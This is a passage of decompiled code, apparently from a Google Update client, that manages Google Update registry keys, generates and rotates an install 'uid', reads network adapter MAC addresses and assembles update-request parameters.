  FUN_00411c69((LPCWSTR)0x1c,ppWVar2,cVar3,pvVar4);
  FUN_00401df0((int **)(local_8 + -0x10));
  return param_1;
}



void * FUN_00411e7c(void *param_1)

{
  int *piVar1;
  LPCWSTR *ppWVar2;
  char cVar3;
  void *pvVar4;
  int local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  cVar3 = '\x01';
  pvVar4 = param_1;
  ppWVar2 = (LPCWSTR *)FUN_00404cfa(&local_8,(HMODULE)L"Google\\Update");
  FUN_00411c69((LPCWSTR)0x26,ppWVar2,cVar3,pvVar4);
  FUN_00401df0((int **)(local_8 + -0x10));
  return param_1;
}



uint FUN_00411ec0(char param_1)

{
  uint uVar1;
  wchar_t *pwVar2;
  int iVar3;
  DWORD DVar4;
  int *piVar5;
  uint uVar6;
  DWORD DVar7;
  undefined8 uVar8;
  undefined **local_14;
  undefined4 local_10;
  int *local_c [2];
  
  uVar1 = FUN_004071a3((HMODULE)L"HKLM\\Software\\Google\\UpdateDev\\",L"UsageStats");
  if ((char)uVar1 == '\0') {
    pwVar2 = L"HKLM\\Software\\Google\\Update\\ClientState\\";
    if (param_1 == '\0') {
      pwVar2 = L"HKCU\\Software\\Google\\Update\\ClientState\\";
    }
    uVar1 = 0;
    local_14 = &PTR_FUN_0042f170;
    local_10 = 0;
    iVar3 = FUN_00406cba(&local_14,(HMODULE)pwVar2,0x20019);
    if (-1 < iVar3) {
      DVar4 = FUN_00407564((int)&local_14);
      DVar7 = 0;
      if (0 < (int)DVar4) {
        do {
          piVar5 = (int *)FUN_0040139e();
          CSimpleStringT__(local_c,piVar5);
          uVar8 = FUN_0040758b(&local_14,DVar7,local_c);
          if ((-1 < (int)uVar8) && (uVar6 = FUN_00414238(param_1,local_c), (char)uVar6 != '\0')) {
            FUN_00401df0((int **)(local_c[0] + -4));
            uVar1 = 1;
            break;
          }
          FUN_00401df0((int **)(local_c[0] + -4));
          DVar7 = DVar7 + 1;
        } while ((int)DVar7 < (int)DVar4);
      }
    }
    local_14 = &PTR_FUN_0042f170;
    uVar6 = FUN_00406ba6((int)&local_14);
    uVar1 = uVar6 & 0xffffff00 | uVar1;
  }
  else {
    uVar1 = CONCAT31((int3)(uVar1 >> 8),1);
  }
  return uVar1;
}



undefined8 FUN_00411f88(void)

{
  int iVar1;
  BOOL BVar2;
  uint uVar3;
  int iVar4;
  byte extraout_CL;
  undefined8 uVar5;
  DWORD local_210;
  int local_20c;
  WCHAR local_208;
  uint local_206 [127];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_208 = L'\0';
  FUN_00416e80(local_206,0,0x1fe);
  local_210 = 0x100;
  BVar2 = GetComputerNameExW(ComputerNameDnsFullyQualified,&local_208,&local_210);
  if ((BVar2 == 0) || (uVar3 = FUN_0040769a(&local_208,L".google.com"), (char)uVar3 == '\0')) {
    local_20c = 0;
    iVar4 = NetWkstaGetInfo(0,100,&local_20c);
    iVar1 = local_20c;
    if ((iVar4 == 0) && (*(int *)(local_20c + 8) != 0)) {
      FUN_00422b1a(extraout_CL);
    }
    NetApiBufferFree(iVar1);
  }
  uVar5 = FUN_0041a954();
  return uVar5;
}



int __thiscall FUN_0041204e(void *this,int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int iVar3;
  int *piVar4;
  int local_c;
  int local_8;
  
                    // WARNING: Load size is inaccurate
  iVar3 = FUN_00411304(*this,(void *)((int)this + 8));
  if (-1 < iVar3) {
    FUN_00404cfa(&local_c,(HMODULE)L"Update2");
    FUN_00404cfa(&local_8,(HMODULE)L"prod");
    FUN_0041227e(this,&local_8,&local_c);
    FUN_00401df0((int **)(local_8 + -0x10));
    FUN_00401df0((int **)(local_c + -0x10));
    FUN_00404cfa(&local_c,(HMODULE)&DAT_00431690);
    FUN_00404cfa(&local_8,DAT_00437e14);
    FUN_004029bc(&local_8,DAT_00437f60,*(int *)(DAT_00437f60 + -0xc));
    FUN_0041227e(this,&local_c,&local_8);
    FUN_00401df0((int **)(local_8 + -0x10));
    FUN_00401df0((int **)(local_c + -0x10));
    FUN_00404cfa(&local_c,(HMODULE)L"lang");
                    // WARNING: Load size is inaccurate
    piVar4 = (int *)FUN_00414330(&local_8,*this);
    FUN_0041227e(this,&local_c,piVar4);
    FUN_00401df0((int **)(local_8 + -0x10));
    FUN_00401df0((int **)(local_c + -0x10));
    FUN_00404cfa(&local_c,(HMODULE)L"guid");
                    // WARNING: Load size is inaccurate
    piVar4 = FUN_00413046(&local_8,*this);
    FUN_0041227e(this,&local_c,piVar4);
    FUN_00401df0((int **)(local_8 + -0x10));
    FUN_00401df0((int **)(local_c + -0x10));
    ppiVar2 = param_1;
    ppiVar1 = (int **)*param_1;
    param_1 = (int **)*ppiVar1;
    if (param_1 != ppiVar1) {
      do {
        FUN_0041227e(this,(int *)(param_1 + 4),(int *)(param_1 + 5));
        FUN_00402ad4((int **)&param_1);
      } while (param_1 != (int **)*ppiVar2);
    }
    iVar3 = 0;
  }
  return iVar3;
}



undefined8 __fastcall FUN_004121a2(undefined4 *param_1)

{
  char cVar1;
  undefined4 *_Memory;
  undefined4 *puVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined8 uVar4;
  undefined6 uVar5;
  undefined4 local_34;
  int local_30;
  void *local_2c;
  uint local_28;
  undefined4 *local_24;
  void *local_20 [6];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_28 = 0;
  piVar3 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_24,piVar3);
  FUN_0041142f(&local_24);
  cVar1 = *(char *)((int)param_1 + 1);
  local_34 = param_1[4];
  local_30 = (int)(param_1[5] - param_1[4]) >> 8;
  uVar5 = FUN_00416f82(200);
  puVar2 = local_24;
  local_2c = (void *)uVar5;
  if (local_2c == (void *)0x0) {
    local_24 = (undefined4 *)0x0;
  }
  else {
    basic_string__((undefined2 *)local_20,(short)((uint6)uVar5 >> 0x20),(undefined4 *)param_1[2]);
    local_28 = 1;
    local_24 = (undefined4 *)
               FUN_004146bd(local_2c,local_20,extraout_ECX,extraout_ECX,param_1,extraout_ECX,
                            -(uint)(cVar1 != '\0') & 2,local_24,&local_34);
  }
  _Memory = (undefined4 *)param_1[3];
  if (local_24 != _Memory) {
    if (_Memory != (undefined4 *)0x0) {
      FUN_004149c2((int)_Memory);
      FID_conflict__free(_Memory);
    }
    param_1[3] = local_24;
  }
  if ((local_28 & 1) != 0) {
    FUN_0040ae40(local_20,'\x01',(void *)0x0);
  }
  FUN_00401df0((int **)(puVar2 + -4));
  uVar4 = FUN_0041a954();
  return uVar4;
}



undefined8 __thiscall FUN_0041227e(void *this,int *param_1,int *param_2)

{
  undefined2 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  undefined4 local_10c [32];
  undefined2 local_8c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (*param_1 != 0) {
                    // WARNING: Subroutine does not return
    __break();
  }
  local_10c[0]._0_2_ = 0;
  if (*param_2 != 0) {
                    // WARNING: Subroutine does not return
    __break();
  }
  local_8c = 0;
  puVar1 = *(undefined2 **)((int)this + 0x14);
  if ((local_10c < puVar1) &&
     (*(undefined2 **)(uint *)((int)this + 0x10) < local_10c ||
      (undefined4 *)*(undefined2 **)(uint *)((int)this + 0x10) == local_10c)) {
    iVar2 = *(int *)((int)this + 0x10);
    if (puVar1 == *(undefined2 **)((int)this + 0x18)) {
      FUN_004124a6((void **)((int)this + 0x10));
    }
    puVar4 = *(undefined4 **)((int)this + 0x14);
    puVar3 = (undefined4 *)(((int)local_10c - iVar2 & 0xffffff00U) + *(int *)((int)this + 0x10));
    if (puVar4 == (undefined4 *)0x0) goto LAB_00412339;
  }
  else {
    if (puVar1 == *(undefined2 **)((int)this + 0x18)) {
      FUN_004124a6((void **)((int)this + 0x10));
    }
    puVar4 = *(undefined4 **)((int)this + 0x14);
    if (puVar4 == (undefined4 *)0x0) goto LAB_00412339;
    puVar3 = local_10c;
  }
  for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
LAB_00412339:
  *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + 0x100;
  uVar5 = FUN_0041a954();
  return uVar5;
}



undefined4 __cdecl
FUN_00412353(short *param_1,short *param_2,char *param_3,undefined4 param_4,undefined4 param_5,
            char param_6)

{
  HANDLE hProcess;
  BOOL BVar1;
  UINT uExitCode;
  
  if ((((param_3 != (char *)0x0) && (param_6 != '\0')) && (param_1 != (short *)0x0)) &&
     (((*param_1 != 0 && (param_2 != (short *)0x0)) && (*param_2 != 0)))) {
    FUN_0041239c(param_3,(char)param_2,param_1,param_2);
  }
  uExitCode = 0x8004ffff;
  hProcess = GetCurrentProcess();
  BVar1 = TerminateProcess(hProcess,uExitCode);
  return CONCAT31((int3)((uint)BVar1 >> 8),1);
}



void __fastcall FUN_0041239c(char *param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  byte bVar1;
  int *piVar2;
  uint extraout_ECX;
  uint extraout_ECX_00;
  undefined8 uVar3;
  byte local_d;
  LPCWSTR apWStack12 [2];
  
  local_d = 0;
  EnumWindows(FUN_00412462,(LPARAM)&local_d);
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(apWStack12,piVar2);
  FUN_00408121((int *)apWStack12,0x16a4);
  FUN_004087b2((int *)apWStack12);
  bVar1 = local_d;
  FUN_00411951(extraout_ECX & 0xffffff00 | (uint)local_d,*param_1,(int *)apWStack12,(int *)0x0);
  if (param_1[1] != '\0') {
    FUN_00408121((int *)apWStack12,0x16b8);
    FUN_004087b2((int *)apWStack12);
    uVar3 = FUN_00407e50(apWStack12[0]);
    if ((char)uVar3 != '\0') {
      FUN_00411951(extraout_ECX_00 & 0xffffff00 | (uint)bVar1,*param_1,(int *)apWStack12,(int *)0x0)
      ;
    }
  }
  FUN_00401df0((int **)(apWStack12[0] + -8));
  return;
}



undefined4 FUN_00412462(HWND param_1,undefined *param_2)

{
  BOOL BVar1;
  DWORD DVar2;
  DWORD local_8;
  
  local_8 = 0;
  GetWindowThreadProcessId(param_1,&local_8);
  BVar1 = IsWindowVisible(param_1);
  if (((BVar1 != 0) && (DVar2 = GetCurrentProcessId(), local_8 == DVar2)) &&
     (param_2 != (undefined *)0x0)) {
    *param_2 = 1;
    return 0;
  }
  return 1;
}



void __fastcall FUN_004124a6(void **param_1)

{
  void *pvVar1;
  code *pcVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  
  pvVar1 = param_1[2];
  if ((int)pvVar1 - (int)param_1[1] >> 8 == 0) {
    iVar4 = (int)param_1[1] - (int)*param_1 >> 8;
    if (iVar4 == 0xffffff) {
      FUN_00422ea9(param_1,(short)pvVar1);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    uVar5 = iVar4 + 1;
    uVar3 = (int)pvVar1 - (int)*param_1 >> 8;
    if (0xffffff - (uVar3 >> 1) < uVar3) {
      uVar3 = 0;
    }
    else {
      uVar3 = uVar3 + (uVar3 >> 1);
    }
    if (uVar3 < uVar5) {
      uVar3 = uVar5;
    }
    FUN_004124ff(param_1,uVar3,uVar3);
  }
  return;
}



void __fastcall FUN_004124ff(void **param_1,undefined4 param_2,uint param_3)

{
  undefined4 *puVar1;
  void *pvVar2;
  void *pvVar3;
  code *pcVar4;
  void **ppvVar5;
  int iVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  undefined4 *puVar10;
  undefined8 uVar11;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  if (param_3 != 0) {
    ppvVar5 = param_1;
    if (param_3 < 0x1000000) {
      ppvVar5 = (void **)(param_3 << 8);
      uVar11 = FUN_00416f82((size_t)ppvVar5);
      param_2 = (undefined4)((ulonglong)uVar11 >> 0x20);
      local_8 = (undefined4 *)uVar11;
      if (local_8 != (undefined4 *)0x0) goto LAB_00412538;
    }
    FUN_00422e78(ppvVar5,param_2);
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
LAB_00412538:
  puVar1 = (undefined4 *)param_1[1];
  puVar7 = local_8;
  for (puVar8 = (undefined4 *)*param_1; puVar8 != puVar1; puVar8 = puVar8 + 0x40) {
    if (puVar7 != (undefined4 *)0x0) {
      puVar9 = puVar8;
      puVar10 = puVar7;
      for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar10 = *puVar9;
        puVar9 = puVar9 + 1;
        puVar10 = puVar10 + 1;
      }
    }
    puVar7 = puVar7 + 0x40;
  }
  pvVar2 = param_1[1];
  pvVar3 = *param_1;
  if (*param_1 != (void *)0x0) {
    FID_conflict__free(*param_1);
  }
  *param_1 = local_8;
  param_1[2] = local_8 + param_3 * 0x40;
  param_1[1] = (void *)(((int)pvVar2 - (int)pvVar3 & 0xffffff00U) + (int)local_8);
  return;
}



undefined4 * __fastcall FUN_004125c4(undefined4 *param_1,char param_2)

{
  int *piVar1;
  int **ppiVar2;
  int local_10;
  int local_c;
  LPWSTR local_8;
  
  local_10 = 0;
  FUN_00411d09();
  if (param_2 == '\0') {
    piVar1 = (int *)FUN_00411e38(&local_c);
  }
  else {
    piVar1 = (int *)FUN_00411e7c(&local_10);
  }
  ppiVar2 = FUN_00401aca((int **)(*piVar1 + -0x10));
  if (param_2 == '\0') {
    FUN_00401df0((int **)(local_c + -0x10));
  }
  else {
    FUN_00401df0((int **)(local_10 + -0x10));
  }
  FUN_00404cfa(&local_8,(HMODULE)(ppiVar2 + 4));
  FUN_00401df0(ppiVar2);
  FUN_00402a4d(&local_8);
  ppiVar2 = FUN_00401aca((int **)(local_8 + -8));
  *param_1 = ppiVar2 + 4;
  FUN_00401df0((int **)(local_8 + -8));
  return param_1;
}



DWORD __thiscall FUN_00412663(void *this,int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  LPCVOID pvVar3;
  int *piVar4;
  BOOL BVar5;
  DWORD DVar6;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  piVar4 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar4);
  FUN_0040814b(&local_8,0x18c0);
  ppiVar2 = param_1;
  ppiVar1 = (int **)*param_1;
  param_1 = (int **)*ppiVar1;
  if (param_1 != ppiVar1) {
    do {
      FUN_0040814b(&local_8,0x18d0);
      FUN_00402ad4((int **)&param_1);
    } while (param_1 != (int **)*ppiVar2);
  }
  pvVar3 = local_8;
  DVar6 = 0;
  local_c = (void *)0x0;
  BVar5 = WriteFile(this,local_8,*(int *)((int)local_8 + -0xc) * 2,(LPDWORD)&local_c,
                    (LPOVERLAPPED)0x0);
  if (BVar5 == 0) {
    DVar6 = FUN_00407e13();
  }
  FUN_00401df0((int **)((int)pvVar3 + -0x10));
  return DVar6;
}



undefined8 FUN_004126fb(void)

{
  code *pcVar1;
  char *pcVar2;
  LPCWSTR pWVar3;
  int iVar4;
  int *piVar5;
  uint uVar6;
  HANDLE hDevice;
  BOOL BVar7;
  int extraout_ECX;
  undefined extraout_DL;
  undefined4 extraout_EDX;
  DWORD DVar8;
  undefined8 uVar9;
  uint *local_25c [3];
  undefined4 local_250;
  DWORD local_24c;
  void *local_248;
  HANDLE local_244;
  int local_240;
  DWORD local_23c;
  char *local_238;
  undefined **local_234;
  HKEY local_230;
  LPCWSTR local_22c;
  undefined **local_228;
  undefined4 local_224;
  int local_220;
  WCHAR local_21c [262];
  undefined local_10 [8];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_230 = (HKEY)0x0;
  local_234 = &PTR_FUN_0042f170;
  iVar4 = FUN_00406cba(&local_234,
                       (HMODULE)
                       L"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards",
                       0x20019);
  if (-1 < iVar4) {
    local_24c = FUN_00407564((int)&local_234);
    DVar8 = 0;
    if (local_24c != 0) {
      do {
        piVar5 = (int *)FUN_0040139e();
        CSimpleStringT__(&local_22c,piVar5);
        uVar9 = FUN_0040758b(&local_234,DVar8,&local_22c);
        pWVar3 = local_22c;
        if (-1 < (int)uVar9) {
          local_224 = 0;
          local_228 = &PTR_FUN_0042f170;
          iVar4 = FUN_00406c76(&local_228,local_230,local_22c,0x20019);
          if (-1 < iVar4) {
            piVar5 = (int *)FUN_0040139e();
            CSimpleStringT__(&local_220,piVar5);
            uVar6 = FUN_00406f9c(&local_228,L"ServiceName",&local_220);
            if (-1 < (int)uVar6) {
              FUN_00427469(extraout_ECX,extraout_DL,local_21c,0x104,0x103,L"\\\\.\\%s",
                           (char)local_220);
              hDevice = CreateFileW(local_21c,0x80000000,7,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                                    (HANDLE)0x0);
              local_244 = hDevice;
              if (hDevice == (HANDLE)0xffffffff) {
                FUN_00407e13();
              }
              else {
                local_250 = 0x1010101;
                local_23c = 6;
                BVar7 = DeviceIoControl(hDevice,0x170002,&local_250,4,local_10,6,&local_23c,
                                        (LPOVERLAPPED)0x0);
                if ((BVar7 == 0) || (local_23c != 6)) {
                  FUN_00407e13();
                }
                else {
                  FUN_00407fdc(local_25c,extraout_EDX);
                  FID_conflict__memcpy(local_25c[0],local_10,6);
                  piVar5 = (int *)FUN_0040139e();
                  if (piVar5 == (int *)0x0) {
                    ATL::AtlThrowImpl(-0x7fffbffb);
                    pcVar1 = (code *)swi(3);
                    uVar9 = (*pcVar1)();
                    return uVar9;
                  }
                  iVar4 = (**(code **)(*piVar5 + 0xc))();
                  local_238 = (char *)(iVar4 + 0x10);
                  FUN_0041465b((byte **)local_25c,&local_238);
                  pcVar2 = local_238;
                  piVar5 = FUN_00407649(&local_240,local_238,*(size_t *)(local_238 + -0xc));
                  FUN_00402b0e(local_248,piVar5);
                  FUN_00401df0((int **)(local_240 + -0x10));
                  FUN_00401df0((int **)(pcVar2 + -0x10));
                  FUN_00402ccf(local_25c);
                  hDevice = local_244;
                }
                CloseHandle(hDevice);
              }
            }
            FUN_00401df0((int **)(local_220 + -0x10));
          }
          local_228 = &PTR_FUN_0042f170;
          FUN_00406ba6((int)&local_228);
        }
        FUN_00401df0((int **)(pWVar3 + -8));
        DVar8 = DVar8 + 1;
      } while (DVar8 < local_24c);
    }
  }
  local_234 = &PTR_FUN_0042f170;
  FUN_00406ba6((int)&local_234);
  uVar9 = FUN_0041a954();
  return uVar9;
}



DWORD __fastcall FUN_004129b5(byte param_1,int param_2)

{
  int iVar1;
  DWORD DVar2;
  ushort extraout_DX;
  LPCWSTR local_1c;
  _SECURITY_ATTRIBUTES local_18;
  
  FUN_00401e5a(&local_1c);
  FUN_004022ce((int)L"{D19BAF17-7C87-467E-8D63-6C4B1C836373}",extraout_DX & 0xff00 | (ushort)param_1
               ,&local_1c);
  iVar1 = FUN_004069a2(local_1c,&local_18);
  *(int *)(param_2 + 4) = iVar1;
  if (iVar1 == 0) {
    iVar1 = FUN_004069a2(local_1c,(LPSECURITY_ATTRIBUTES)0x0);
    *(int *)(param_2 + 4) = iVar1;
    if (iVar1 == 0) {
      DVar2 = FUN_00407e13();
      goto LAB_00412a08;
    }
  }
  DVar2 = 0;
LAB_00412a08:
  FUN_00401e83((int *)&local_1c);
  return DVar2;
}



uint __thiscall FUN_00412a18(byte param_1,int *param_2,int param_3)

{
  wchar_t *pwVar1;
  int *piVar2;
  uint uVar3;
  undefined4 extraout_ECX;
  uint uVar4;
  undefined **local_24;
  undefined4 local_20;
  undefined **local_1c;
  undefined4 local_18;
  int *local_14;
  int *local_10;
  HMODULE local_c [2];
  
  uVar4 = 0;
  local_1c = &PTR_FUN_0042fad8;
  local_18 = 0;
  FUN_004129b5(param_1,(int)&local_1c);
  (*(code *)local_1c[1])();
  FUN_00411d09();
  pwVar1 = L"HKLM\\Software\\Google\\Update\\";
  if (param_1 == 0) {
    pwVar1 = L"HKCU\\Software\\Google\\Update\\";
  }
  FUN_00404cfa(local_c,(HMODULE)pwVar1);
  FUN_00404cfa(&local_10,(HMODULE)&DAT_00431800);
  piVar2 = FUN_004025b5((int *)&local_14,(int *)local_c,&local_10);
  FUN_00401b2a(local_c,piVar2);
  FUN_00401df0((int **)(local_14 + -4));
  FUN_00401df0((int **)(local_10 + -4));
  FUN_00407222(local_c[0]);
  local_20 = 0;
  local_24 = &PTR_FUN_0042f170;
  uVar3 = FUN_00406c2a(&local_24,local_c[0],extraout_ECX,extraout_ECX,6,extraout_ECX,&local_14);
  if (-1 < (int)uVar3) {
    if (param_3 - (int)param_2 >> 2 != 0) {
      do {
        uVar3 = FUN_004070c6(&local_24,(LPCWSTR)param_2[uVar4],L"",1);
        if ((int)uVar3 < 0) goto LAB_00412afe;
        uVar4 = uVar4 + 1;
      } while (uVar4 < (uint)(param_3 - (int)param_2 >> 2));
    }
    uVar3 = 0;
  }
LAB_00412afe:
  local_24 = &PTR_FUN_0042f170;
  FUN_00406ba6((int)&local_24);
  FUN_00401df0((int **)(local_c[0] + -4));
  (*(code *)local_1c[2])();
  FUN_00406a0c(&local_1c);
  FUN_0040800d(&param_2);
  return uVar3;
}



int FUN_00412b33(void)

{
  int *piVar1;
  wchar_t *pwVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  LSTATUS LVar6;
  uint uVar7;
  undefined8 uVar8;
  int *local_28;
  int *local_24;
  undefined4 local_20;
  undefined **local_1c;
  HKEY local_18;
  int local_14;
  int *local_10;
  HMODULE local_c;
  byte local_5;
  
  local_28 = (int *)0x0;
  local_24 = (int *)0x0;
  local_20 = 0;
  uVar8 = FUN_004126fb();
  piVar1 = local_24;
  if (((int)uVar8 < 0) || (local_28 == local_24)) {
    iVar5 = 1;
  }
  else {
    FUN_00411d09();
    pwVar2 = L"HKLM\\Software\\Google\\Update\\";
    if (local_5 == 0) {
      pwVar2 = L"HKCU\\Software\\Google\\Update\\";
    }
    FUN_00404cfa(&local_c,(HMODULE)pwVar2);
    FUN_00404cfa(&local_10,(HMODULE)&DAT_00431800);
    piVar3 = FUN_004025b5(&local_14,(int *)&local_c,&local_10);
    FUN_00401b2a(&local_c,piVar3);
    FUN_00401df0((int **)(local_14 + -0x10));
    FUN_00401df0((int **)(local_10 + -4));
    uVar4 = FUN_00407139(local_c);
    if ((char)uVar4 == '\0') {
      iVar5 = FUN_00412c62(local_5,'\x01');
    }
    else {
      local_1c = &PTR_FUN_0042f170;
      local_18 = (HKEY)0x0;
      iVar5 = FUN_00406cba(&local_1c,local_c,1);
      if (-1 < iVar5) {
        uVar7 = 0;
        uVar4 = (int)piVar1 - (int)local_28 >> 2;
        if (uVar4 != 0) {
          do {
            LVar6 = RegQueryValueExW(local_18,(LPCWSTR)local_28[uVar7],(LPDWORD)0x0,(LPDWORD)0x0,
                                     (LPBYTE)0x0,(LPDWORD)0x0);
            if (LVar6 == 0) {
              iVar5 = 0;
              goto LAB_00412c31;
            }
            uVar7 = uVar7 + 1;
          } while (uVar7 < uVar4);
        }
        iVar5 = FUN_00412c62(local_5,'\0');
      }
LAB_00412c31:
      local_1c = &PTR_FUN_0042f170;
      FUN_00406ba6((int)&local_1c);
    }
    FUN_00401df0((int **)(local_c + -4));
  }
  FUN_0040800d(&local_28);
  return iVar5;
}



undefined4 __fastcall FUN_00412c62(byte param_1,char param_2)

{
  LPCWSTR pWVar1;
  wchar_t *pwVar2;
  LSTATUS LVar3;
  uint uVar4;
  int *piVar5;
  undefined2 extraout_DX;
  undefined8 uVar6;
  undefined **local_20;
  undefined4 local_1c;
  undefined **local_18;
  HKEY local_14;
  DWORD local_10;
  DWORD local_c;
  LPCWSTR local_8;
  
  local_20 = &PTR_FUN_0042fad8;
  local_1c = 0;
  FUN_004129b5(param_1,(int)&local_20);
  (*(code *)local_20[1])();
  local_18 = &PTR_FUN_0042f170;
  local_14 = (HKEY)0x0;
  FUN_00411d09();
  pwVar2 = L"HKLM\\Software\\Google\\Update\\";
  if (param_1 == 0) {
    pwVar2 = L"HKCU\\Software\\Google\\Update\\";
  }
  FUN_00406cba(&local_18,(HMODULE)pwVar2,0xf003f);
  LVar3 = RegQueryValueExW(local_14,L"old-uid",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)0x0,(LPDWORD)0x0);
  if (LVar3 == 0) {
    FUN_00406b76(&local_18,L"uid");
  }
  else {
    local_8 = (LPCWSTR)0x0;
    local_10 = 0;
    local_c = 0;
    uVar4 = FUN_00406e46(&local_18,L"uid",&local_c,&local_8,&local_10);
    if (-1 < (int)uVar4) {
      uVar4 = FUN_00407102(&local_18,L"old-uid",(BYTE *)local_8,local_10,local_c);
      if (-1 < (int)uVar4) {
        FUN_00406b76(&local_18,L"uid");
      }
    }
    FID_conflict__free(local_8);
    if (param_2 != '\0') {
      piVar5 = (int *)FUN_0040139e();
      CSimpleStringT__(&local_8,piVar5);
      FUN_00406f9c(&local_18,L"old-uid",(int *)&local_8);
      FUN_00402d6d(&local_8,extraout_DX,(int)L"; legacy");
      pWVar1 = local_8;
      FUN_004070c6(&local_18,L"old-uid",local_8,1);
      FUN_00401df0((int **)(pWVar1 + -8));
    }
  }
  uVar6 = FUN_00412dfa(param_1);
  local_18 = &PTR_FUN_0042f170;
  FUN_00406ba6((int)&local_18);
  (*(code *)local_20[2])();
  FUN_00406a0c(&local_20);
  return (int)uVar6;
}



void __fastcall FUN_00412da1(void *param_1)

{
  undefined8 uVar1;
  void *local_8;
  
  local_8 = param_1;
  uVar1 = FUN_00407c01();
  __aulldiv((uint)uVar1,(uint)((ulonglong)uVar1 >> 0x20),10000000,0);
  FUN_0040709d(param_1,L"uid-create-time");
  local_8 = (void *)0x0;
  FUN_00406ebd(param_1,L"uid-num-rotations",&local_8);
  local_8 = (void *)((int)local_8 + 1);
  FUN_0040709d(param_1,L"uid-num-rotations");
  return;
}



undefined8 __fastcall FUN_00412dfa(byte param_1)

{
  uint uVar1;
  wchar_t *pwVar2;
  LSTATUS LVar3;
  int *piVar4;
  HRESULT HVar5;
  undefined4 extraout_ECX;
  undefined8 uVar6;
  LPCWSTR pWVar7;
  int local_30;
  LPCWSTR local_2c;
  undefined **local_28;
  undefined4 local_24;
  undefined **local_20;
  HKEY local_1c;
  undefined local_18 [4];
  int *local_14;
  int *local_10;
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if ((param_1 == 0) || (uVar1 = FUN_004142d7(), (char)uVar1 == '\0')) {
    local_28 = &PTR_FUN_0042fad8;
    local_24 = 0;
    FUN_004129b5(param_1,(int)&local_28);
    (*(code *)local_28[1])();
    local_20 = &PTR_FUN_0042f170;
    local_1c = (HKEY)0x0;
    FUN_00411d09();
    pwVar2 = L"HKLM\\Software\\Google\\Update\\";
    if (param_1 == 0) {
      pwVar2 = L"HKCU\\Software\\Google\\Update\\";
    }
    uVar1 = FUN_00406c2a(&local_20,(HMODULE)pwVar2,extraout_ECX,extraout_ECX,0xf003f,extraout_ECX,
                         (int **)0x0);
    if ((-1 < (int)uVar1) &&
       (LVar3 = RegQueryValueExW(local_1c,L"uid",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)0x0,(LPDWORD)0x0)
       , LVar3 != 0)) {
      piVar4 = (int *)FUN_0040139e();
      CSimpleStringT__(&local_2c,piVar4);
      local_18 = 0;
      local_14 = (int *)0x0;
      local_10 = (int *)0x0;
      local_c = 0;
      HVar5 = CoCreateGuid((GUID *)local_18);
      if (-1 < HVar5) {
        uVar6 = FUN_00402534(&local_30,(GUID *)local_18);
        FUN_00401b2a(&local_2c,(int *)uVar6);
        FUN_00401df0((int **)(local_30 + -0x10));
        piVar4 = (int *)&DAT_00431800;
        pWVar7 = local_2c;
        uVar1 = FUN_004070c6(&local_20,L"uid",local_2c,1);
        if (-1 < (int)uVar1) {
          FUN_004095ae((int)&PTR_PTR_FUN_00436638);
          FUN_00412da1(&local_20);
          local_14 = (int *)0x0;
          local_10 = (int *)0x0;
          local_c = 0;
          uVar6 = FUN_004126fb();
          if ((-1 < (int)uVar6) && (local_14 != local_10)) {
            FUN_004130f8((int *)&stack0xffffffb8,(int)((ulonglong)uVar6 >> 0x20),&local_14);
            FUN_00412a18(param_1,piVar4,(int)pWVar7);
          }
          FUN_0040800d(&local_14);
        }
      }
      FUN_00401df0((int **)(local_2c + -8));
    }
    local_20 = &PTR_FUN_0042f170;
    FUN_00406ba6((int)&local_20);
    (*(code *)local_28[2])();
    FUN_00406a0c(&local_28);
  }
  uVar6 = FUN_0041a954();
  return uVar6;
}



void __fastcall FUN_00412f94(byte param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  undefined8 uVar3;
  undefined **local_14;
  undefined4 local_10;
  undefined **local_c;
  undefined4 local_8;
  
  if ((param_1 != 0) && (uVar3 = FUN_00408420(), (char)uVar3 == '\0')) {
    return;
  }
  local_10 = 0;
  local_14 = &PTR_FUN_0042fad8;
  FUN_004129b5(param_1,(int)&local_14);
  (*(code *)local_14[1])();
  local_8 = 0;
  local_c = &PTR_FUN_0042f170;
  FUN_00411d09();
  pwVar1 = L"HKLM\\Software\\Google\\Update\\";
  if (param_1 == 0) {
    pwVar1 = L"HKCU\\Software\\Google\\Update\\";
  }
  iVar2 = FUN_00406cba(&local_c,(HMODULE)pwVar1,0xf003f);
  if (-1 < iVar2) {
    FUN_00406b76(&local_c,L"uid");
    FUN_00406b76(&local_c,L"old-uid");
    FUN_00406b46(&local_c,L"uid");
  }
  local_c = &PTR_FUN_0042f170;
  FUN_00406ba6((int)&local_c);
  (*(code *)local_14[2])();
